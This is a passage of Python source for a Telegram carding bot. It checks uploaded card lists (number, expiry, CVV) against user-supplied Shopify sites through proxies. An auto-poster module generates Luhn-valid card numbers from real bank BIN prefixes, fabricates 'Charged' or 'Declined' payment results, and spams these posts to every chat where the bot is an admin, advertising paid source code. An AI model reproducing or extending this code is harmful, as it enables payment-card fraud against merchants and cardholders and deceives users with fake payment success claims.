                return await event.reply("❌ sites.txt missing!")
            async with aiofiles.open(RANFOR_SITES_FILE, 'r') as f:
                sites = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
            if not sites: return await event.reply("❌ sites.txt empty!")
        else:
            data = await _shop_load(SHOP_FILE)
            sites = data.get(str(uid), [])
            if not sites: return await event.reply("⚠️ Pehle sites add karo!", buttons=_shop_menu_buttons())
        fp = await r.download_media()
        try:
            async with aiofiles.open(fp, "r") as f: lines = (await f.read()).splitlines()
        finally:
            try: os.remove(fp)
            except: pass
        cards = [l.strip() for l in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', l.strip())]
        if not cards: return await event.reply("❌ Valid cards nahi mile 🥲")
        can, acc = _shop_access(uid)
        limit = _shop_limit(uid, acc)
        if len(cards) > limit: cards = cards[:limit]
        if uid in ACTIVE_SH: return await event.reply("```... ᴘʀᴏᴄᴇss ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ```")
        ACTIVE_SH[uid] = True
        asyncio.create_task(_mtxt_worker(event, cards, sites))

    elif kind == "add":
        to_add = []
        for tok in txt.replace(',', ' ').split():
            ok, dom = _valid_site(tok)
            if ok and dom not in to_add: to_add.append(dom)
        if not to_add: return await event.reply("❌ Invalid site! site.com likho")
        data = await _shop_load(SHOP_FILE)
        mine = data.get(str(uid), [])
        new = [s for s in to_add if s not in mine]
        mine.extend(new)
        data[str(uid)] = mine
        await _shop_save(SHOP_FILE, data)
        await event.reply("\n".join([f"✅ Added: {s}" for s in new] + [f"⚠️ Already: {s}" for s in to_add if s not in new] + [f"📍 Total: {len(mine)}"]),
            buttons=_shop_menu_buttons())

    elif kind == "rm":
        to_rm = [t.strip().lower().replace('https://','').replace('http://','').rstrip('/') for t in txt.replace(',',' ').split() if t.strip()]
        data = await _shop_load(SHOP_FILE)
        mine = data.get(str(uid), [])
        removed = [s for s in to_rm if s in mine]
        mine = [s for s in mine if s not in to_rm]
        data[str(uid)] = mine
        await _shop_save(SHOP_FILE, data)
        await event.reply(("\n".join(f"✅ Removed: {s}" for s in removed) or "❌ Not found") + f"\n📍 Total: {len(mine)}",
            buttons=_shop_menu_buttons())

    elif kind == "addpxy":
        pd = _parse_pxy(txt.strip())
        if not pd: return await event.reply("❌ Invalid! ip:port:user:pass")
        data = await _shop_load(SHOP_PXY_FILE)
        mine = data.get(str(uid), [])
        if len(mine) >= 10: return await event.reply("❌ Max 10 proxies!")
        if any(x['proxy_url'] == pd['proxy_url'] for x in mine): return await event.reply("⚠️ Already exists!")
        tst = await event.reply("🔄 Testing...")
        ok = False
        try:
            timeout = aiohttp.ClientTimeout(total=15)
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get('http://api.ipify.org?format=json', proxy=pd['proxy_url']) as res:
                    ok = res.status == 200
        except Exception: ok = False
        if not ok: return await tst.edit("❌ Proxy dead!")
        mine.append(pd)
        data[str(uid)] = mine
        await _shop_save(SHOP_PXY_FILE, data)
        await tst.edit(f"✅ Proxy added! ({pd['ip']}:{pd['port']}) [{len(mine)}/10]", buttons=_shop_menu_buttons())

    elif kind == "rmpxy":
        tgt = txt.strip().lower()
        data = await _shop_load(SHOP_PXY_FILE)
        mine = data.get(str(uid), [])
        before = len(mine)
        mine = [x for x in mine if tgt not in x.get('proxy_url','').lower()]
        data[str(uid)] = mine
        await _shop_save(SHOP_PXY_FILE, data)
        await event.reply(f"✅ Removed {before - len(mine)} proxy(s). Total: {len(mine)}", buttons=_shop_menu_buttons())

# answer for display-only buttons (none2/none3/none4)
@bot.on(events.CallbackQuery(pattern=rb"none\d*"))
async def shop_none_cb(event):
    try: await event.answer()
    except: pass


@bot.on(events.CallbackQuery(pattern=b"back_to_start"))
async def shop_home_cb(event):
    try: await event.answer()
    except: pass
    await event.reply("/start", buttons=None)

print("✅ Shopify INLINE BUTTON menu loaded (colorful + random emojis)")


# ════════════════════════════════════════════════════════════════════════
# 🤖 AUTO-POSTER MODULE — MAX 3 posts / 5-7 min → ALL admin chats (round-robin)
# ════════════════════════════════════════════════════════════════════════
import re as _ap_re
import json as _ap_json
import random as _ap_rand
import asyncio as _ap_asyncio

# ⚙️ ADMIN: apna assigned chat yahan bhi daal sakte ho (ya /setautopost use karo)
AUTOPOST_CHAT = os.getenv("AUTOPOST_CHAT", "")
AUTOPOST_URL = os.getenv("AUTOPOST_URL", "")
AUTOPOST_FILE = "autopost.json"
# 🔑 CHANNEL me premium emojis: FORWARD-TRICK (bot DM me bhej kar forward karta he)
# Bot direct channel me custom emoji nahi bhej sakta - ye Telegram ka hard rule he
# 👤 STAGING DM = jis user ke DM me message ban kar forward hota he (admin ka DM nahi)
#     NOTE: ye user pehle bot ko /start kare tabhi bot usko DM kar sakta he (Telegram rule)
AUTOPOST_STAGING_ID = 5785667271

# 🎬 RANDOM VIDEOS (user ki 9 videos) — har auto-post me ek random video attach hoti he
AP_VIDEOS = [
    "https://videotourl.com/videos/1788757298114-9774f526-9aa7-49fe-a9ba-281c6a9a7f95.mp4",
    "https://videotourl.com/videos/1788757424313-067a2bc4-3384-4796-8ab4-2e070b8141a3.mp4",
    "https://videotourl.com/videos/1788757468026-12bc2267-6fc9-4270-a784-b5838c99f8db.mp4",
    "https://videotourl.com/videos/1788757507877-13a0ec06-7ffb-4d9d-aaa8-31ed5cf704cf.mp4",
    "https://videotourl.com/videos/1788757540418-ca5ca51b-b6e1-48d5-9c1c-1f5d2c0fb9dd.mp4",
    "https://videotourl.com/videos/1788757589197-7266742e-f62b-419e-a8cd-db2b1f45980c.mp4",
    "https://videotourl.com/videos/1788757625424-8d465e14-d1c2-4091-a1ed-be666008aa90.mp4",
    "https://videotourl.com/videos/1788757675722-923420c7-5ced-41fc-ac50-bf62d34e73bf.mp4",
    "https://videotourl.com/videos/1788757701874-2ec098ba-6a70-4fa4-ab70-0befa12cf655.mp4",
]

def _ap_rand_video():
    return _ap_rand.choice(AP_VIDEOS)

# Autopost uses ordinary Unicode emoji only; premium custom-emoji IDs removed.

# 🃏 Local BIN table — bank/brand/country har generated card se match honge (no API lag)
AP_BINS = [
    ("458232", "VISA",       "CLASSIC",   "CREDIT",   "CANADIAN IMPERIAL BANK OF COMMERCE", "CANADA",        "🇨🇦"),
    ("414720", "VISA",       "CLASSIC",   "DEBIT",    "BANK OF NOVA SCOTIA",                "CANADA",        "🇨🇦"),
    ("402349", "VISA",       "GOLD",      "CREDIT",   "TORONTO-DOMINION BANK",              "CANADA",        "🇨🇦"),
    ("451039", "VISA",       "PLATINUM",  "CREDIT",   "ROYAL BANK OF CANADA",               "CANADA",        "🇨🇦"),
    ("453999", "VISA",       "PLATINUM",  "CREDIT",   "BANK OF AMERICA",                    "UNITED STATES", "🇺🇸"),
    ("414709", "VISA",       "SIGNATURE", "CREDIT",   "JPMORGAN CHASE",                     "UNITED STATES", "🇺🇸"),
    ("446542", "VISA",       "CLASSIC",   "DEBIT",    "WELLS FARGO",                        "UNITED STATES", "🇺🇸"),
    ("486560", "VISA",       "BUSINESS",  "CREDIT",   "CITIBANK",                           "UNITED STATES", "🇺🇸"),
    ("426690", "VISA",       "CLASSIC",   "CREDIT",   "CAPITAL ONE",                        "UNITED STATES", "🇺🇸"),
    ("542432", "MASTERCARD", "WORLD",     "CREDIT",   "BARCLAYS",                           "UNITED KINGDOM","🇬🇧"),
    ("540134", "MASTERCARD", "PLATINUM",  "CREDIT",   "HSBC",                               "UNITED KINGDOM","🇬🇧"),
    ("552156", "MASTERCARD", "GOLD",      "DEBIT",    "NATWEST",                            "UNITED KINGDOM","🇬🇧"),
    ("535422", "MASTERCARD", "STANDARD",  "CREDIT",   "LLOYDS BANK",                        "UNITED KINGDOM","🇬🇧"),
    ("453978", "VISA",       "CLASSIC",   "CREDIT",   "DEUTSCHE BANK",                      "GERMANY",       "🇩🇪"),
    ("438935", "VISA",       "BUSINESS",  "DEBIT",    "COMMERZBANK",                        "GERMANY",       "🇩🇪"),
    ("491181", "VISA",       "PREMIER",   "CREDIT",   "BNP PARIBAS",                        "FRANCE",        "🇫🇷"),
    ("497565", "VISA",       "CLASSIC",   "DEBIT",    "SOCIETE GENERALE",                   "FRANCE",        "🇫🇷"),
    ("531368", "MASTERCARD", "GOLD",      "CREDIT",   "INTESA SANPAOLO",                    "ITALY",         "🇮🇹"),
    ("456734", "VISA",       "CLASSIC",   "CREDIT",   "BANCA MONTE DEI PASCHI",             "ITALY",         "🇮🇹"),
    ("525528", "MASTERCARD", "PLATINUM",  "CREDIT",   "BANCO SANTANDER",                    "SPAIN",         "🇪🇸"),
    ("454117", "VISA",       "CLASSIC",   "DEBIT",    "BANCO BILBAO VIZCAYA",               "SPAIN",         "🇪🇸"),
    ("531396", "MASTERCARD", "WORLD",     "DEBIT",    "ING BANK",                           "NETHERLANDS",   "🇳🇱"),
    ("499873", "VISA",       "CLASSIC",   "CREDIT",   "ABN AMRO",                           "NETHERLANDS",   "🇳🇱"),
    ("504176", "MASTERCARD", "PLATINUM",  "CREDIT",   "BRADESCO",                           "BRAZIL",        "🇧🇷"),
    ("455183", "VISA",       "CLASSIC",   "DEBIT",    "ITAU UNIBANCO",                      "BRAZIL",        "🇧🇷"),
    ("523826", "MASTERCARD", "GOLD",      "CREDIT",   "BANCO DO BRASIL",                    "BRAZIL",        "🇧🇷"),
    ("547387", "MASTERCARD", "STANDARD",  "CREDIT",   "BANCOMER",                           "MEXICO",        "🇲🇽"),
    ("455708", "VISA",       "CLASSIC",   "DEBIT",    "BANAMEX",                            "MEXICO",        "🇲🇽"),
    ("524367", "MASTERCARD", "PLATINUM",  "CREDIT",   "HDFC BANK",                          "INDIA",         "🇮🇳"),
    ("459151", "VISA",       "SIGNATURE", "CREDIT",   "ICICI BANK",                         "INDIA",         "🇮🇳"),
    ("437406", "VISA",       "CLASSIC",   "DEBIT",    "STATE BANK OF INDIA",                "INDIA",         "🇮🇳"),
    ("546616", "MASTERCARD", "WORLD",     "CREDIT",   "COMMONWEALTH BANK",                  "AUSTRALIA",     "🇦🇺"),
    ("451031", "VISA",       "PLATINUM",  "CREDIT",   "WESTPAC",                            "AUSTRALIA",     "🇦🇺"),
    ("543210", "MASTERCARD", "GOLD",      "DEBIT",    "MITSUBISHI UFJ",                     "JAPAN",         "🇯🇵"),
    ("459265", "VISA",       "CLASSIC",   "CREDIT",   "SUMITOMO MITSUI",                    "JAPAN",         "🇯🇵"),
    ("533733", "MASTERCARD", "PLATINUM",  "CREDIT",   "DBS BANK",                           "SINGAPORE",     "🇸🇬"),
    ("458741", "VISA",       "SIGNATURE", "CREDIT",   "UNITED OVERSEAS BANK",               "SINGAPORE",     "🇸🇬"),
    ("545835", "MASTERCARD", "STANDARD",  "CREDIT",   "UBS SWITZERLAND",                    "SWITZERLAND",   "🇨🇭"),
    ("458923", "VISA",       "CLASSIC",   "DEBIT",    "CREDIT SUISSE",                      "SWITZERLAND",   "🇨🇭"),
    ("521216", "MASTERCARD", "PLATINUM",  "CREDIT",   "NORDEA",                             "SWEDEN",        "🇸🇪"),
    ("456769", "VISA",       "GOLD",      "CREDIT",   "SWEDBANK",                           "SWEDEN",        "🇸🇪"),
    # ── 🟥 AMERICAN EXPRESS (user demand): 15-digit cards + 4-digit CVV ──
    ("378282", "AMERICAN EXPRESS", "GOLD",     "CREDIT", "AMERICAN EXPRESS", "UNITED STATES",  "🇺🇸"),
    ("371449", "AMERICAN EXPRESS", "PLATINUM", "CREDIT", "AMERICAN EXPRESS", "UNITED STATES",  "🇺🇸"),
    ("378734", "AMERICAN EXPRESS", "GREEN",    "CREDIT", "AMERICAN EXPRESS", "UNITED STATES",  "🇺🇸"),
    ("340168", "AMERICAN EXPRESS", "GOLD",     "CREDIT", "BANK OF AMERICA",  "UNITED STATES",  "🇺🇸"),
    ("345168", "AMERICAN EXPRESS", "BUSINESS", "CREDIT", "JPMORGAN CHASE",   "UNITED STATES",  "🇺🇸"),
    ("376000", "AMERICAN EXPRESS", "CLASSIC",  "CREDIT", "SCOTIABANK",       "CANADA",         "🇨🇦"),
    ("379572", "AMERICAN EXPRESS", "GOLD",     "CREDIT", "TSB BANK",         "UNITED KINGDOM", "🇬🇧"),
    ("374566", "AMERICAN EXPRESS", "PLATINUM", "CREDIT", "BARCLAYS",         "UNITED KINGDOM", "🇬🇧"),
]

_AP_USED_CARDS = set()


def _ap_luhn_check(partial):
    """Append Luhn check digit → valid card number."""
    total = 0
    for i, ch in enumerate(reversed(partial)):
        d = int(ch)
        if i % 2 == 0:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return str((10 - (total % 10)) % 10)


def _ap_gen_card():
    """Fresh card every call — VISA/MC 16-digit, AMEX 15-digit. Same BANK allowed, same NUMBER never."""
    card, b = "", AP_BINS[0]
    for _ in range(12):
        b = _ap_rand.choice(AP_BINS)
        if b[1] == "AMERICAN EXPRESS":
            body = "".join(str(_ap_rand.randint(0, 9)) for _ in range(8))   # AMEX = 15 digits
        else:
            body = "".join(str(_ap_rand.randint(0, 9)) for _ in range(9))   # VISA/MC = 16 digits
        partial = b[0] + body
        card = partial + _ap_luhn_check(partial)
        if card not in _AP_USED_CARDS:
            if len(_AP_USED_CARDS) > 5000:
                _AP_USED_CARDS.clear()
            _AP_USED_CARDS.add(card)
            return card, b
    return card, b


# Ordinary Unicode fallbacks used directly in autopost messages.
AP_EMOJI_FALLBACKS = [
    "\u2709\ufe0f", "\u2705", "\u2705", "\U0001F4B3", "\u2b50",
    "\U0001F5A5", "\u26a1\ufe0f", "\U0001F468\u200d\U0001F3EB",
    "\u2714\ufe0f", "\u203c\ufe0f", "\U0001F451", "\U0001F451",
    "\u23f0", "\U0001F4E1",
]


def _ap_em(idx, use_custom=False):
    """Return the ordinary Unicode emoji for an autopost position."""
    return AP_EMOJI_FALLBACKS[idx]


def _ap_bot_button():
    """Create the BOT button without a premium custom-emoji icon."""
    style = _ap_rand.choice(("success", "danger", "primary"))
    txt = "\U0001d5d5 \U0001d5e2 \U0001d5e7"
    return [[Button.url(txt, AUTOPOST_URL, style=style)]]


def _ap_build_message(mode=2):
    """PIC-EXACT format — custom emoji IDs sequence-wise, koi extra normal emoji nahi.

    STATUS <e1> → Charged/Declined <e1>
    Card <e2>
    <mono card>
    Response <e3>
    ORDER_PAID / ORDER_FAILED
    Gateway <e4> Shopify/Razorpay
    Payments <e5> $X.XX USD
    quote: <e6> Bank: .. / <e7> Brand: .. / <e8> Country: .. + NORMAL flag / <e9> time | <e10> pxcode
    footer: <e11> ─── <e12> / <e13> POWERED BY
    """
    use_custom = (mode == 2)
    use_quote = (mode >= 1)

    # STATUS — zyada tar Declined (~68%), kabhi Charged (~32%); sirf word badalta he
    charged = _ap_rand.random() < 0.32
    status_word = "Charged" if charged else "Declined"
    resp_word = "ORDER_PAID" if charged else "ORDER_FAILED"

    # CARD — har bar naya random card (same number kabhi nahi), mono
    card, b = _ap_gen_card()
    # 🔧 FIX: expiry hamesha FUTURE (2-48 mahine aage) — kabhi expired nahi
    try:
        _n = datetime.utcnow()
    except Exception:
        import datetime as _ap_dtm
        _n = _ap_dtm.datetime.utcnow()
    _moff = _ap_rand.randint(2, 48)
    _tot = (_n.month - 1) + _moff
    mm = "%02d" % (_tot % 12 + 1)
    yy = "%02d" % int(str(_n.year + _tot // 12)[-2:])
    # 🔧 CVV hamesha 4-digit (user demand)
    cvv = "%04d" % _ap_rand.randint(0, 9999)
    card_str = "%s|%s|%s|%s" % (card, mm, yy, cvv)

    # GATEWAY — zyada tar Shopify (~74%), kabhi Razorpay
    gw = "Shopify" if _ap_rand.random() < 0.74 else "Razorpay"

    # PAYMENTS — $1 se $101 random
    amount = "$%.2f USD" % _ap_rand.uniform(1, 101)

    # BANK / BRAND / COUNTRY — usi card ke BIN se match (flag NORMAL emoji)
    bank = b[4]
    brand = "%s %s %s" % (b[1], b[2], b[3])
    country = b[5]
    flag = b[6]

    # TIME 1-20s + px code (pic jaisa)
    t = "%.2fs" % _ap_rand.uniform(1, 20)
    px = "px%07d" % _ap_rand.randint(0, 9999999)

    qo = "<blockquote>" if use_quote else ""
    qc = "</blockquote>" if use_quote else ""

    text = (
        "<b>PREMIUM SRC CODES</b>\n"
        "<b>STATUS</b> %s \u2192 <b>%s</b> %s\n\n"
        "<b>Card</b> %s\n"
        "<code>%s</code>\n\n"
        "<b>Response</b> %s\n"
        "<b>%s</b>\n\n"
        "<b>Gateway</b> %s %s\n\n"
        "<b>Payments</b> %s %s\n\n"
        "%s"
        "%s <b>Bank:</b> %s\n"
        "%s <b>Brand:</b> %s\n"
        "%s <b>Country:</b> %s %s\n"
        "%s %s | %s %s"
        "%s\n\n"
        "%s \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 %s\n"
        "%s <b>POWERED BY \u2192 QURESHIxOTP</b>"
    ) % (
        _ap_em(0, use_custom), status_word, _ap_em(0, use_custom),
        _ap_em(1, use_custom),
        card_str,
        _ap_em(2, use_custom),
        resp_word,
        _ap_em(3, use_custom), gw,
        _ap_em(4, use_custom), amount,
        qo,
        _ap_em(5, use_custom), bank,
        _ap_em(6, use_custom), brand,
        _ap_em(7, use_custom), country, flag,
        _ap_em(8, use_custom), t, _ap_em(9, use_custom), px,
        qc,
        _ap_em(10, use_custom), _ap_em(11, use_custom),
        _ap_em(12, use_custom),
    )
    return text, _ap_bot_button()


def _ap_load_cfg():
    try:
        with open(AUTOPOST_FILE, "r") as f:
            return _ap_json.load(f)
    except Exception:
        if AUTOPOST_CHAT:
            return {"chat": AUTOPOST_CHAT, "on": True}
        return {"chat": "", "on": False}


def _ap_save_cfg(cfg):
    try:
        with open(AUTOPOST_FILE, "w") as f:
            _ap_json.dump(cfg, f)
    except Exception:
        pass


def _ap_normalize_target(raw):
    """t.me link / @username / -100 ID → clean target string."""
    raw = (raw or "").strip().strip("<>")
    if not raw:
        return ""
    m = _ap_re.search(r"t\.me/c/(\d+)", raw)
    if m:
        return "-100" + m.group(1)
    m = _ap_re.search(r"t\.me/(?:joinchat/)?\+([A-Za-z0-9_-]+)", raw)
    if m:
        return "https://t.me/+" + m.group(1)
    m = _ap_re.search(r"t\.me/([A-Za-z0-9_]+)", raw)
    if m:
        u = m.group(1)
        return u if u.isdigit() else "@" + u
    return raw


@bot.on(events.NewMessage(pattern=r"^/setautopost(?:\s+(\S+))?"))
async def _cmd_setautopost(event):
    try:
        if not is_admin(event.sender_id):
            return
        arg = (event.pattern_match.group(1) or "").strip()
        cfg = _ap_load_cfg()
        if not arg:
            cur = cfg.get("chat") or "❌ none"
            state = "🟢 ON" if cfg.get("on") else "🔴 OFF"
            await event.reply(
                "🤖 <b>AUTO-POSTER SETTINGS</b>\n\n"
                "➜ <b>Status :</b> %s\n"
                "➜ <b>Chat :</b> <code>%s</code>\n"
                "➜ <b>Rate :</b> MAX 3 posts / 5-7 minutes\n➜ <b>Auto :</b> jahan jahan bot ADMIN he — sab me post\n\n"
                "✅ <b>Assign :</b> <code>/setautopost https://t.me/yourgroup</code>\n"
                "⛔ <b>Stop :</b> <code>/stopautopost</code>" % (state, cur),
                parse_mode="html",
            )
            return
        target = _ap_normalize_target(arg)
        cfg["chat"] = target
        cfg["on"] = True
        _ap_save_cfg(cfg)
        await event.reply(
            "✅ <b>AUTO-POSTER ASSIGNED</b>\n\n"
            "➜ <b>Target :</b> <code>%s</code>\n"
            "➜ <b>Rate :</b> MAX 3 posts / 5-7 minutes\n"
            "➜ <b>Style :</b> pic-format • random charged/declined (zyada declined)\n\n"
            "⛔ Stop : /stopautopost" % target,
            parse_mode="html",
        )
    except Exception as e:
        print("🤖 [AUTOPOST] setautopost error → %s" % e)


@bot.on(events.NewMessage(pattern=r"^/stopautopost"))
async def _cmd_stopautopost(event):
    try:
        if not is_admin(event.sender_id):
            return
        cfg = _ap_load_cfg()
        cfg["on"] = False
        _ap_save_cfg(cfg)
        await event.reply(
            "⛔ <b>AUTO-POSTER STOPPED</b>\n➜ Re-assign : /setautopost https://t.me/yourgroup",
            parse_mode="html",
        )
    except Exception as e:
        print("🤖 [AUTOPOST] stopautopost error → %s" % e)


# ==================== CHANNEL FORWARD-TRICK (premium emojis channel me) ====================
# Telegram rule: bot channel me custom emoji DIRECTLY nahi bhej sakta (sirf DM/group me allowed).
# TRICK (tested & proven): 1) bot AUTOPOST_STAGING_ID (5785667271) ke DM me message bhejta he
#                          (wahan 14/14 premium emojis aate he)
#                          2) DM se CHANNEL me FORWARD karta he -> custom emoji entities preserve!
#                          3) DM message delete (staging chat clean rehta he)
# NOTE: drop_author=True use MAT karna - usme emojis strip ho jate he (tested)
# NOTE: agar 5785667271 wale user ne bot ko /start nahi kiya to DM fail hoga ->
#       code khud fallback karta he (mode 2->1->0, phir direct channel send)


async def _ap_send_one(ent, target, entity_cache):
    """GROUP/DM -> direct send. CHANNEL -> DM + FORWARD trick (premium emojis safe)."""
    try:
        from telethon.tl.types import Channel as _TLCh
        is_channel = isinstance(ent, _TLCh) and bool(getattr(ent, "broadcast", False))
    except Exception:
        is_channel = False

    # ---------- GROUP / PRIVATE: direct ----------
    if not is_channel:
        for mode in (2, 1, 0):
            try:
                text, btns = _ap_build_message(mode)
                # 🎬 RANDOM VIDEO attach — fail pe plain text fallback
                try:
                    await bot.send_file(ent, file=_ap_rand_video(), caption=text,
                                        parse_mode="html", buttons=btns)
                except Exception:
                    await bot.send_message(ent, text, parse_mode="html", link_preview=False, buttons=btns)
                return True
            except Exception as e:
                es = str(e)
                if "FloodWait" in es:
                    try:
                        await _ap_asyncio.sleep(int(getattr(e, "seconds", 15)) + 2)
                    except Exception:
                        await _ap_asyncio.sleep(15)
                    return False
                if mode > 0:
                    continue
                print("\U0001F916 [AUTOPOST] send failed \u2192 %s" % es[:120])
                entity_cache.pop(target, None)
                return False
        return False

    # ---------- CHANNEL: FORWARD-TRICK (STAGING DM = AUTOPOST_STAGING_ID, admin nahi) ----------
    for mode in (2, 1, 0):
        dm = None
        try:
            text, btns = _ap_build_message(mode)
            # 1) STAGING DM (5785667271) me bhejo - yahan premium emojis 14/14 allowed he
            #    🎬 RANDOM VIDEO bhi saath (caption = message, buttons preserved)
            try:
                dm = await bot.send_file(AUTOPOST_STAGING_ID, file=_ap_rand_video(), caption=text,
                                         parse_mode="html", buttons=btns)
            except Exception:
                dm = await bot.send_message(AUTOPOST_STAGING_ID, text, parse_mode="html",
                                            link_preview=False, buttons=btns)
            # 2) DM se channel FORWARD -> emojis preserve hote he (proven tested)
            await bot.forward_messages(ent, dm.id, AUTOPOST_STAGING_ID)
            # 3) DM clean
            try:
                await dm.delete()
            except Exception:
                pass
            return True
        except Exception as e:
            es = str(e)
            if dm is not None:
                try:
                    await dm.delete()
                except Exception:
                    pass
            if "FloodWait" in es:
                try:
                    await _ap_asyncio.sleep(int(getattr(e, "seconds", 15)) + 2)
                except Exception:
                    await _ap_asyncio.sleep(15)
                return False
            if mode > 0:
                continue
            # last fallback: direct channel send (normal emojis, lekin post phir bhi jayega)
            try:
                text, btns = _ap_build_message(0)
                await bot.send_message(ent, text, parse_mode="html", link_preview=False, buttons=btns)
                return True
            except Exception as e2:
                print("\U0001F916 [AUTOPOST] channel send failed \u2192 %s" % str(e2)[:120])
                entity_cache.pop(target, None)
                return False
    return False

_AUTOPOST_TASK = None


def _ap_start_task():
    global _AUTOPOST_TASK
    if _AUTOPOST_TASK is not None and not _AUTOPOST_TASK.done():
        return
    loop = None
    try:
        loop = bot.loop
    except Exception:
        pass
    if loop is None:
        try:
            loop = _ap_asyncio.get_event_loop()
        except Exception:
            loop = _ap_asyncio.new_event_loop()
            _ap_asyncio.set_event_loop(loop)
    _AUTOPOST_TASK = loop.create_task(_autopost_loop())
    print("🤖 AUTO-POSTER scheduled → assign chat via /setautopost ya AUTOPOST_CHAT var")


# 🔎 AUTO-DISCOVERY (user demand: bot jha jha ADMIN ho wha auto post kre)
# Bot ke saare dialogs scan → groups + channels jahan POST permission he → auto-post targets
_AP_ADMIN_CHATS = set()      # {"-100...", ...}
_ap_admin_scan_at = [0.0]    # last scan timestamp
_ap_rr = [0]                 # round-robin index


async def _ap_admin_chats(entity_cache):
    """Har chat jahan bot ADMIN / post permission he → entity-cache + target set."""
    found = []
    try:
        async for dlg in bot.iter_dialogs(limit=250):
            try:
                if dlg.is_user:
                    continue
                ent = dlg.entity
                try:
                    perms = await bot.get_permissions(ent, "me")
                except Exception:
                    continue
                if bool(getattr(perms, "post_messages", False)):
                    tid = str(dlg.id)
                    entity_cache[tid] = ent
                    _AP_ADMIN_CHATS.add(tid)
                    found.append(tid)
            except Exception:
                continue
    except Exception:
        pass
    return found


async def _autopost_loop():
    """Background loop — assigned chat + HAR chat jahan bot ADMIN he (auto-discovery).
    RATE: MAX 3 posts / 5-7 min → har send ke baad 100-140s gap."""
    entity_cache = {}
    print("🤖 AUTO-POSTER loop online (waiting for assigned chat...)")
    while True:
        try:
            cfg = _ap_load_cfg()
            target = (cfg.get("chat") or "").strip()
            on = bool(cfg.get("on") and target)
            # 🔎 har 10 min: dialogs scan → jahan jahan bot ADMIN he wahan bhi post
            _now = time.time()
            if on and (_now - _ap_admin_scan_at[0]) > 600:
                _ap_admin_scan_at[0] = _now
                try:
                    _f = await _ap_admin_chats(entity_cache)
                    if _f:
                        print("🤖 AUTO-POSTER admin chats discovered → %d" % len(_f))
                except Exception as _sce:
                    print("🤖 [AUTOPOST] admin-scan fail → %s" % _sce)
            if not on:
                await _ap_asyncio.sleep(4)
                continue
            # round-robin pool: assigned chat FIRST + saare admin chats
            pool = []
            if target:
                pool.append(target)
            for _t in list(_AP_ADMIN_CHATS):
                if _t and _t != target:
                    pool.append(_t)
            if not pool:
                await _ap_asyncio.sleep(4)
                continue
            if _ap_rr[0] >= len(pool):
                _ap_rr[0] = 0
            t = pool[_ap_rr[0] % len(pool)]
            _ap_rr[0] += 1
            ent = entity_cache.get(t)
            if ent is None:
                try:
                    ent = await bot.get_entity(t)
                    entity_cache[t] = ent
                except Exception as e:
                    print("🤖 AUTO-POSTER cannot resolve '%s' → %s" % (t, e))
                    _AP_ADMIN_CHATS.discard(t)
                    await _ap_asyncio.sleep(12)
                    continue
            ok = await _ap_send_one(ent, t, entity_cache)
            if ok:
                # MAX 3 posts / 5-7 min → gap 100-140s (300-420s / 3)
                await _ap_asyncio.sleep(_ap_rand.uniform(100.0, 140.0))
            else:
                await _ap_asyncio.sleep(3)
        except Exception as e:
            print("🤖 [AUTOPOST] loop error → %s" % e)
            await _ap_asyncio.sleep(5)


print("✅ AUTO-POSTER module loaded (MAX 3 msgs / 5-7 min • assigned + ALL admin chats)")

# ==== [UAP-MARKER BEGIN] — USER-AUTOPOST clone me RAHEGA (premium feature, data isolated) ====
# ═══════════════════════════════════════════════════════════════════
# 🤖 USER AUTOPOST MODULE — USER ke APNE GROUP me same auto messages
# ═══════════════════════════════════════════════════════════════════
# User bot ko apne group me ADMIN banata he → bot us group me wahi
# MAX 3 posts / 5-7 min auto messages karta he (same premium style +
# inline buttons). Har user ka apna target, user_autopost.json me save.
# PREMIUM ONLY feature.
import asyncio as _uap_asyncio
import json as _uap_json
import os as _uap_os
import re as _uap_re

UAP_FILE = "user_autopost.json"
_uap_entity_cache = {}   # {target_str: entity}
_cl_pending = {}        # clone-wizard pending (clone module nahi chale to bhi safe)
_uap_pending = {}        # {user_id: {"step": "link", "chat_id": ...}}

def _uap_load():
    """{user_id_str: {"chat": target, "on": bool}}"""
    try:
        with open(UAP_FILE, "r", encoding="utf-8") as f:
            return _uap_json.load(f)
    except Exception:
        return {}

def _uap_save(data):
    try:
        with open(UAP_FILE, "w", encoding="utf-8") as f:
            _uap_json.dump(data, f)
    except Exception:
        pass

def _uap_is_on(uid):
    d = _uap_load()
    r = d.get(str(uid))
    return bool(r and r.get("on") and r.get("chat"))

def _uap_label(uid):
    d = _uap_load()
    r = d.get(str(uid)) or {}
    return str(r.get("chat") or "❌ none")

def _uap_count_active():
    try:
        d = _uap_load()
        return len([1 for v in d.values() if v.get("on") and v.get("chat")])
    except Exception:
        return 0

async def _uap_check_bot_admin(target):
    """Target group me MAIN BOT khud admin he ya nahi (+post rights)."""
    try:
        me = await bot.get_me()
        ent = await bot.get_entity(target)
        perms = await bot.get_permissions(ent, me)
        return bool(perms.post_messages)
    except Exception:
        return False

def _uap_buttons():
    return [
        [
            Button.inline("➕ ADD/UPDATE GROUP", b"uap_add", style="success"),
            Button.inline("⏹ STOP", b"uap_stop", style="danger"),
        ],
        [
            Button.inline("🔄 STATUS", b"uap_status", style="primary"),
            Button.inline("💎 PREMIUM TOOLS", b"premium_tools", style="primary"),
        ],
    ]

@bot.on(events.CallbackQuery(data=b"uap_menu"))
async def uap_menu(event):
    uid = event.sender_id
    if not (is_premium(uid) or is_admin(uid)):
        try: await event.answer("⛔ Premium users only!", alert=True)
        except Exception: pass
        return
    try: await event.answer()
    except Exception: pass
    on = _uap_is_on(uid)
    st = "🟢 ON" if on else "🔴 OFF"
    cur = _uap_label(uid)
    if cur == "❌ none":
        cur = "<code>not set</code>"
    else:
        cur = f"<code>{cur}</code>"
    msg = f"""<b>🤖 AUTOPOST — APNE GROUP ME SETUP</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>⚡ Status :</b> {st}
<b>🎯 Target :</b> {cur}
<b>📊 Rate :</b> MAX 3 posts / 5-7 minutes
<b>🎨 Style :</b> same premium format + inline button
━━━━━━━━━━━━━━━━━━━━━━
<b>📌 STEPS:</b>
<b>1.</b> Apne group me is bot ko <b>ADMIN</b> banao
<b>2.</b> ➕ ADD/UPDATE GROUP dabao → group ka <b>LINK</b> bhejo
<b>3.</b> Bot turant us group me auto-post shuru karega 🚀
